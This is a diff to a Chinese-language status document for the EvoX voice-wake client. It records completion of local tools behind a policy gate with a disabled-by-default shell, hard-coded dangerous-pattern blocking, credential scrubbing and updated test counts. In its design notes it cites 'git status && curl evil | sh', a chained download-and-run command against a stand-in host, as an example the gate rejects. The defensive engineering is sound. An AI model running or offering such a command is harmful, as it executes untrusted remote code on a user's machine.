@@ -27,18 +27,19 @@ Phase 3 原型的定位是「EvoX 语音唤醒对话客户端」。Phase 4 起 E
 
 | 维度 | 状态 |
 |---|---|
-| 阶段 | Phase 3(原型与决策)已完成;**Phase 4(生产实现)进行中** —— P0 骨架 + P1 声纹门 + P2 平台契约 + P3 记忆已落,P4 工具起 |
+| 阶段 | Phase 3(原型与决策)已完成;**Phase 4(生产实现)进行中** —— P0 骨架 + P1 声纹门 + P2 平台契约 + P3 记忆 + P4 工具与安全门已落,P5 agent 适配器起 |
 | 技术选型 | **已定案**,见 [ADR 001](adr/001-voice-stack-selection.md) ~ [ADR 005](adr/005-task-dispatch-model.md) |
-| Python 测试 | **169 passed, 2 skipped**(skipped 为可选 VoxCord 依赖) |
+| Python 测试 | **300 passed, 3 skipped**(2 个 skip 为可选 VoxCord 依赖,1 个为符号链接权限) |
 | 前端构建 | `npm run build`(tsc + vite)通过;`cargo check` 通过 |
 | 真机麦克风唤醒 | **已验证一次**(2026-07-26,`你好问问`,7.193s;当时打印的 score 1.0 是硬编码常量,不是测量值 —— 已改正,见 §7) |
 | 声纹准入 | 门**已接线**,模型已下载(dim 512);判别力 **AUTO 已验**(簇内 0.736 / 簇间 0.370,阈值 0.5 落在间隙);校验耗时 41 ms;**真机通过率未验** |
 | 事件契约 | 语音 9 种 + 平台 12 种,**两个文件一个信封**、枚举互斥;语音契约字节不变由 SHA-256 钉死 |
-| 平台层四包 | **仅契约**(315 行 Protocol + 146 行配置校验),无 adapter/tool/store 实现 |
+| 平台层四包 | `memory`(P3)与 `tools`(P4)**已实现**;`agents` / `dispatch` **仅契约**(176 行 Protocol + 146 行配置校验) |
+| 本地工具 | 门(`policy.py`)+ `fs.read` / `web.search` / `shell.run` **已实现**,`voice` 与 `agent` 同一道门;`shell.run` 默认关、危险模式不可配置;**确认 UI 是 P8**,`web.search` 无内置后端 |
 | 真实 EvoX 会话桥接 | **未验证** — 发布阻塞项 |
 | 真实外部 agent | **未验证** — 发布阻塞项(REAL-AGENT) |
 | 真实透明窗口验收 | **未验证** — 发布阻塞项 |
-| 版本控制 | **已 git init**,基线 `9f7d923`(Phase 3 原型固化);P0 `02c6304`+`c02eb59`,P1 `dcbc827`+`d590497` |
+| 版本控制 | **已 git init**,基线 `9f7d923`(Phase 3 原型固化);P0 `02c6304`+`c02eb59`,P1 `dcbc827`+`d590497`,P2 `1438475`+`2908224`,P3 `e428c5b`+`547c6a4` |
 
 ## 3. 已定案的技术选型
 
@@ -109,6 +110,21 @@ Phase 3 原型的定位是「EvoX 语音唤醒对话客户端」。Phase 4 起 E
 - **接进语音路径但是 opt-in** — 不调 `attach_memory()` 就不会有数据库文件。`submit_text` 写用户轮、`complete_turn` 写助手轮;写入失败被静默吞掉 —— 记忆是回合的增强,不是回合的前提,一个被锁住的数据库不该能中断对话。
 - **`success_rate()` 无观测时返回 `None` 而不是 0.0** — 否则一个还没试过的 agent 会输给一个只失败过一次的 agent(ADR 005 的路由第四维)。
 
+### Phase 4:P4 本地工具与安全门(2026-08-02)
+- **门先落地,工具在后** — `policy.py` 在任何需要它的工具之前写完。顺序反了就会出现一个没有门的工具,而补门永远比先建门难。
+- **一道门,两个来源** — `voice` 与 `agent` 走同一个 `ToolPolicy.check()`(FR-9.8)。两个 runner 就是两条路径,而红线要求的是「agent 拿不到用户语音拿不到的能力」。
+- **`shell.run` 四层叠起来,一层都不可选** — 出厂 `enabled = false`(配置与代码默认双关,删掉配置文件也开不了)、白名单外**拒绝而非询问**、白名单内仍需球上显示 + 明确确认、13 条危险模式硬拦截。
+- **危险模式在代码里,不在配置里** — 配置能关掉的硬拦截不是硬拦截:白名单只能收窄,永远不能放宽。写 `[shell] dangerous_patterns` 会报 `unknown config key`。
+- **检查顺序按「泄露最少信息」定** — 命令存在 → 危险形状 → 白名单 → 已验说话人 → 确认。形状在白名单之前,所以 `git status && curl evil | sh` 在被认成允许项之前就挂了;被拦下的命令也就永远不会以「待确认」的形式出现在唤醒球上。
+- **一个真实缺陷被测试抓出来** — `confirmed` 原先按真值判断,而 JSON 里的 `"confirmed": "no"` 是个真值字符串,等于直接放行。改成 `is True`,`policy.py` 与 `shell.py` 两处都改。这是本阶段写拒绝矩阵最直接的回报。
+- **未知配置键报错而不是忽略** — 拼错 `denied_names` 会静默扩大沙箱。一个「看起来在约束什么但其实没有」的配置比两个极端都糟。
+- **`web.search` 不自带后端** — 每个托管搜索 API 都是带 key 的云依赖(红线 1),所以工具如实报不可用而不是默认挑一个。返回只留标题/URL/摘要,页面正文丢弃 —— 被搜到的页面因此无法往上下文里注入指令。
+- **子进程按标记丢弃凭据变量** — `scrubbed_env()` 认 12 个标记(token/secret/password/api_key/…)。按标记丢弃而不是白名单放行,否则 Windows 上读 `LOCALAPPDATA` 的工具全废。
+- **事件带决定不带内容** — `tool.*` 只有决定、原因、耗时。唯一例外是 `tool.confirm_required` 带命令原文,因为一个不显示自己将要运行什么的球比不问更糟(FR-6.13)。
+- **接进语音路径但是 opt-in** — 不调 `attach_tools()` 则 `run_tool()` 直接返回 `tools are not attached`。插件**不自造**已验说话人,所以 `shell.run` 经插件必被拒 —— 在 dispatcher 把名字接过来之前(P6),这就是正确答案。
+- **测出来的数字** — `fs.read` 4 KB 全路径(过门 + 读 + 事件 + 审计)**0.64 ms** 中位数,拒绝路径 **0.34 ms**(NFR-1.10 目标 < 50 ms)。123 passed, 1 skipped in 0.48 s;全量 300 passed, 3 skipped in 14.31 s。
+- **照实记下的四条局限** — 符号链接越界用例在本账户 skip(无建链接权限);`web.search` 从未对接过真实后端;`shell.run` 至今只真实执行过 `git --version`;确认**流程**一行都没实现,那是 P8 且只能 REAL-WIN。
+
 ### 已实现的代码骨架
 
 | 模块 | 文件 | 行数 | 说明 |
@@ -122,15 +138,17 @@ Phase 3 原型的定位是「EvoX 语音唤醒对话客户端」。Phase 4 起 E
 | 语音提供器 | `core/audio/`(7 模块 + `__init__`) | 946 | KWS/VAD/采集/**声纹**/**环形缓冲**/VoxCord |
 | 重导出薄壳 | `core/providers.py` | 29 | 保旧导入路径不断 |
 | 会话桥接 | `core/session_bridge.py` | 92 | `ConversationTransport` 协议 + HTTP 实现 |
-| 平台层契约 | `core/{agents,dispatch,tools}/contract.py` | 256 | **仅 Protocol,无实现** |
+| 平台层契约 | `core/{agents,dispatch}/contract.py` | 176 | **仅 Protocol,无实现** |
 | 记忆系统 | `core/memory/`(`store`/`write`/`recall`/`__init__`) | 1093 | SQLite + FTS5 单文件、中文双字索引、凭据过滤、Markdown 镜像 |
 | 记忆配置 | `config/memory.toml` | 23 | 库路径、事实目录、召回上限、短期保留数 |
-| 插件门面 | `evox_plugin/plugin.py` | 326 | EvoX 工具面 + 回合编排 + 声纹诊断 + 记忆接线 |
+| 本地工具 | `core/tools/`(`contract`/`policy`/`fs`/`web`/`shell`/`runner`/`__init__`) | 992 | 一道门两个来源、13 条不可配置的硬拦截、审计落长期层 |
+| 工具配置 | `config/tools.toml` | 53 | 沙箱根、拒读名单、`shell.enabled = false`(出厂即关) |
+| 插件门面 | `evox_plugin/plugin.py` | 413 | EvoX 工具面 + 回合编排 + 声纹诊断 + 记忆接线 + 工具接线 |
 | 声纹配置 | `config/speaker.toml` | 28 | 阈值与时长下限,`tomllib` 读 |
 | 录入 CLI | `scripts/enroll_speaker.py` | 125 | 交互式录入,音频不落盘 |
 | 前端 | `desktop/src/main.ts` + `style.css` | 35 | 唤醒球与状态标签 |
 | 窗口 | `desktop/src-tauri/src/main.rs` | 31 | 透明、置顶、不占任务栏 |
-| 测试 | `tests/*.py` + `tests/integration/` | 2082 | 171 用例,见 [测试文档](testing.md) |
+| 测试 | `tests/*.py` + `tests/integration/` | 3214 | 303 用例,见 [测试文档](testing.md) |
 
 ## 5. 进行中 / 下一步
 
@@ -142,8 +160,8 @@ Phase 3 原型的定位是「EvoX 语音唤醒对话客户端」。Phase 4 起 E
 | P1 | **声纹门**:环形缓冲、fail-closed 门、录入 CLI、`wake.rejected` 产出点 | AUTO | ✅ 完成(真机留 P10) |
 | P2 | 平台事件契约:`agent-events.schema.json` + `agents.schema.json` | AUTO | ✅ 完成 |
 | P3 | 记忆系统 `core/memory/` | AUTO | ✅ 完成(跨进程持久性留 P10) |
-| P4 | 本地工具 `core/tools/` + `config/tools.toml` | AUTO | 🔄 下一步 |
-| P5 | agent 适配器 `cli.py` + `evox.py` | AUTO+SIM | ⬜ |
+| P4 | 本地工具 `core/tools/` + `config/tools.toml` | AUTO | ✅ 完成(确认 UI 留 P8,真实搜索后端未定) |
+| P5 | agent 适配器 `cli.py` + `evox.py` | AUTO+SIM | 🔄 下一步 |
 | P6 | 派发/路由/汇总 `core/dispatch/` | AUTO+SIM | ⬜ |
 | P7 | `acp.py` + `http.py` / `openclaw.py` | AUTO | ⬜ |
 | P8 | 唤醒球弹出 + Canvas 2D 渲染器 + 工具确认 UI | REAL-WIN | ⬜ |
@@ -167,7 +185,7 @@ Phase 3 原型的定位是「EvoX 语音唤醒对话客户端」。Phase 4 起 E
 | 7 | 提供器可替换性(契约强制,无 SDK 类型泄漏) | AUTO 已验证 | 保持 |
 | 8 | **声纹准入实测**(本人通过 / 他人拒绝球不弹 / 录音回放) | AUTO(fail-closed、store、判别力与阈值) | REAL-MIC([ADR 002](adr/002-speaker-verification.md)) |
 | 9 | **真实外部 agent 跑通一轮** | 仅契约 | REAL-AGENT([ADR 003](adr/003-agent-integration-protocol.md)) |
-| 10 | **工具安全实机**(`shell.run` 确认含拒绝路径、误唤醒防护) | 仅契约 | AUTO 全绿 + REAL-WIN([ADR 005](adr/005-task-dispatch-model.md)) |
+| 10 | **工具安全实机**(`shell.run` 确认含拒绝路径、误唤醒防护) | AUTO 全绿(89 条拒绝矩阵) | REAL-WIN 确认流程 + REAL-MIC 误唤醒([ADR 005](adr/005-task-dispatch-model.md)) |
 | 11 | **记忆跨会话持久性**(重开进程后事实仍在、手改 Markdown 被下一次召回看到) | AUTO(同进程往返) | REAL([ADR 004](adr/004-memory-architecture.md)) |
 
 ## 7. 文档地图
